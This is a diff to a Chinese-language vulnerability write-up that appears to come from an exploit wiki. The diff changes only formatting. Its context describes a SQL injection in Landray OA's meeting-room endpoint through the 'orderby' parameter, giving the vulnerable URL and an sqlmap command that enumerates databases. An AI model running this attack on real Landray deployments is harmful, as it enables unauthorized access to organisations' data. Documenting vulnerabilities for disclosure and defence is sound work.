@@ -20,7 +20,7 @@ app="Landray-OA系统"
 
 存在SQL注入的 Url为,这里拿官方的演示站点演示漏洞过程
 
-```plain
+```
 https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true
 ```
 
@@ -48,11 +48,11 @@ Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943
 
 保存为文件，使用 Sqlmap 跑一下注入
 
-```plain
+```
 sqlmap -r sql.txt -p orderby --dbs
 ```
 
-![7028e5e6-5d0f-44f9-a3e0-044636024b0c](images/202202090127479.png)
+![7028e5e6-5d0f-44f9-a3e0-044636024b0c](../.gitbook/assets/202202090127479.png)
 
 ## 感谢名单
 
